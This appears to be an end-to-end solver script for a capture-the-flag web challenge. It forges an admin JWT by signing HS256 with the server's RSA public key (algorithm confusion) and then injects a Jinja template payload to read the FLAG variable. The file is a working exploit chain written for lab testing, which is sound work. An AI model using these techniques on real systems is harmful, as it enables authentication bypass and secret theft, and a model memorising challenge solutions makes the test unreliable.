#!/usr/bin/env python3
"""
web-jwtopia end-to-end smoke test.
Path: fetch /public.pem -> forge HS256 admin token signed with the RSA public key
(alg-confusion) -> SSTI on /admin/report -> read FLAG from env.
Exit 0 = PASS.
"""
import base64
import hashlib
import hmac
import json
import os
import re
import sys

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10001").rstrip("/")


def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_hs256(payload, key):
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    body = b64url(json.dumps(payload, separators=(",", ":")))
    sig = hmac.new(key, f"{header}.{body}".encode(), hashlib.sha256).digest()
    return f"{header}.{body}.{b64url(sig)}"


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def solve():
    pub = requests.get(f"{TARGET}/public.pem", timeout=10).content
    token = forge_hs256({"sub": "attacker", "role": "admin"}, pub)
    ssti = "{{config.__class__.__init__.__globals__['FLAG']}}"
    r = requests.post(
        f"{TARGET}/admin/report",
        headers={"Authorization": f"Bearer {token}"},
        json={"template": ssti},
        timeout=10,
    )
    return r.json().get("output", "")


def main():
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
